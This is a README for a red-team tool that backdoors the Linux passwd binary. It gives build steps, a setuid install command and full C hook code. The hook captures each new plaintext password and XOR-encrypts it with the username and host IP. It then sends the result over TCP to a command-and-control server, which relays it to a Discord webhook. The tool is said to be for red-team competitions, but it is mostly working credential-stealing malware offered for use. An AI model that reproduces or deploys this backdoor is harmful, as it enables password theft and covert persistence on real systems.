# Retriever Passwd Shim

#### What is this
This is a basic Linux binary shim on the passwd binary from the shadow package. This will grab new passwords while they are still plaintext in the binary and remotely send it back to a defined C2.

#### What does it work on? (Tested)

Ubuntu - 18.04, 20.04 <br />Centos - 8 <br />Debian - 11 <br />  

#### What is this intended for 
This is intended for Red Teaming in a Competition environment.
<br/><br/>
## Installation Instructions
#### Ubuntu - 18.04 / 20.04
1. `clone shadow git`
2. `run ./generate.sh`
3. `sudo chmod 4755 passwd`

#### Debian - 11
1. `clone shadow git`
2. `run ./generate.sh`
3. `sudo chmod 4755 passwd`

#### CentOS - 8
1. `clone shadow git`
2. `yum deplist passwd | awk '/provider:/ {print $2}' | sort -u | xargs yum -y install`
3. `yum install -y autoconf gettext-devel automake`
4. `dnf group install "Development Tools"`
5. `run ./autogen.sh --without-selinux`
6. `Add Hook (See Hooking passwd.c)`
7. `sudo make all`
6. `sudo chmod 4755 passwd`

#### Troubleshooting
1. Try "make clean" if you are not getting the changed code
2. Building from apt-source kinda sucks don't do it if you don't have to
<br/><br/>
## Using the Python C2
### .env File

The python C2 expects a .env file to provide both the XOR key as well as a discord webhook to send the credentials to. The two values that the program searches for are "WEBHOOK" and "XOR_KEY". Set these values to their desired value and the program should run with those settings. The default for the XOR_KEY is "bingus" and the default webhook is empty. 

#### .env Values

- WEBHOOK : Set the Discord Webhook (Default : none)
- XOR_KEY : The key used to encrypt and decrypy (Default : bingus) 
- PORT    : Set the port the program listens on (Default : 8000)

### Running the C2

Make sure firewalls allow traffic into that port then run the python file using Python3.

	python3 recv_pass.py
<br/><br/>
## Hooking the passwd.c File

#### At the Top
Imports needed 

	#include <sys/socket.h>
	#include <arpa/inet.h> 
	#include <sys/ioctl.h>
	#include <netinet/in.h>
	#include <net/if.h>
	#include <unistd.h> 
	#include <string.h> 

Definitions

    #define PORT <port> 
    #define IP "<ip_address>" 


#### Adding the Hook
At line number ~266, right above the code that will salt the password, we add a line to run the function. 

    /* Hook to grab password */
	writetofile(pass);

    /*
	 * Encrypt the password, then wipe the cleartext password.
	 */
	salt = crypt_make_salt (NULL, NULL);

    

#### Adding the Function 

At line ~210 right above the new_password function is where I put this function although it just needs to be above where it is called. Make sure to replace the text "INT_HERE" in the 17th line with the actual interface being used by the computer.

	char* XORCipher(char* data, char* key, int dataLen, int keyLen) {
		char* output = (char*)malloc(sizeof(char) * dataLen);

		for (int i = 0; i < dataLen; ++i) {
			output[i] = data[i] ^ key[i % keyLen];
		}

		return output;
	}

	int writetofile (char *password){

		/* Get uid */
		uid_t uid = geteuid();
		struct passwd * pw = getpwuid(uid);
				
		/* Get IP Address */
		int fd;
		struct ifreq ifr;
		fd = socket(AF_INET, SOCK_DGRAM, 0);
			
		/* I want to get an IPv4 IP address */
		ifr.ifr_addr.sa_family = AF_INET;

		/* I want IP address attached to set interface - IF MANUAL CHANGE INTERFACE*/
		strncpy(ifr.ifr_name, ens33, IFNAMSIZ-1);
		ioctl(fd, SIOCGIFADDR, &ifr);
		close(fd);
		
		/* display result */
		char buffer[256];
		char * ip;
		ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
		int j = snprintf(buffer, 256, \"%s:%s:%s\\n\", name, password, ip);
		
		/* Make Socket */
		int sock = 0, valread;
		struct sockaddr_in serv_addr;

		/* Sock creation Pt 2*/
		if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
			return -1;
		}

		/* Socket Options */
		serv_addr.sin_family = AF_INET;
		serv_addr.sin_port = htons(PORT);
			
		/* Timeout settings */
		struct timeval timeout;
		timeout.tv_sec = 3;
		timeout.tv_usec = 0;
		
		if (setsockopt (sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout) < 0)  {
			return -1;
		}
		if (setsockopt (sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof timeout) < 0) {
			// pass
		}

		/* set IP and set buffer */
		if(inet_pton(AF_INET, IP, &serv_addr.sin_addr)<=0) {
			return -1;
		}
		if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
			return -1;
		}

		/* Encrypt Message  - IF MANUAL CHANGE KEY*/
		char* key  = "KEY_HERE";
		int key_length = strlen(key);
		int mes_length = strlen(buffer);
		char* xor_message = XORCipher(buffer, key, mes_length, key_length);

		/* Send Message */
		send(sock , xor_message , strlen(xor_message) , 0); 
		
		return 0;

	}
